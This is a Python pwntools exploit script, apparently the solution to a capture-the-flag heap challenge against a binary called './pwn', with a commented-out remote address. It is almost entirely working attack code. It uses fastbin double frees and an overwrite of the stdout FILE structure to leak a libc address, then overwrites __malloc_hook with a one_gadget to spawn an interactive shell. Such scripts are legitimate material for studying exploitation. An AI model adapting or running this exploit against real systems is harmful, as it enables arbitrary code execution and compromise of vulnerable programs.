#!usr/bin/env python
# -*- coding:utf-8 -*-
 
from pwn import *

context.log_level ='DEBUG'

r = process('./pwn')
# r = remote('47.93.30.224',10001)
elf = ELF('./pwn')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def add(length,name,color):
    r.recvuntil("Your choice :")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.send(name)
    r.recvuntil(":")
    r.sendline(color)

def remove(idx):
    r.recvuntil("Your choice :")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil("Your choice :")
    r.sendline("3")

add(0x28,'a','a')
add(0x28,p64(0)+p64(0x101),'b')
add(0x28,p64(0)+p64(0x101),'b')
add(0x28,p64(0)+p64(0x101),'b')
add(0x68,'c'*0x60+p64(0x100),'c')
add(0x68,'c'*0x60+p64(0x100),'c')
remove(0)
remove(1)


add(0x68,'e','e')
add(0x68,'7'*8,'7'*8)
add(0x68,'8'*8,'8'*8)
remove(6)
remove(7)
remove(8)

add('0'*5000,'a','a')
add(0x68,p16(0x25dd),'a')
# gdb.attach(r)
remove(4)
remove(5)
remove(4)
add(0x68,p8(0xc0),'b')
add(0x68,p8(0xc0),'b')
add(0x68,p8(0xc0),'b')
add(0x68,p8(0xc0),'b')

pay = 0x33*'A' + p64(0xfbad1800) + p64(0)*3 + '\x00'
r.recvuntil("Your choice :")
r.sendline("1")
r.recvuntil(":")
r.sendline(str(0x60))
r.recvuntil(":")
r.send(pay)
# gdb.attach(r)
stderr = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print hex(stderr)
libc_base = stderr+0x20 - libc.sym['_IO_2_1_stdout_']
print hex(libc_base)

r.recvuntil(":")
r.sendline('aaaa')

one = [0x45226,0x4527a,0xf0364,0xf1207]
onegadget = libc_base + one[3]
malloc_hook = stderr - 0xaf0
realloc = libc.symbols['realloc']+libc_base
print hex(malloc_hook)

#get shell
remove(10)
remove(11)
remove(10)
add(0x60,p64(malloc_hook-0x23),'b')
add(0x60,'a','a')
add(0x60,'a','a')
payload = 'a'*0x13 + p64(onegadget)
add(0x60,payload,'d')

#double触发malloc_hook
remove(0)
remove(0)


r.interactive()
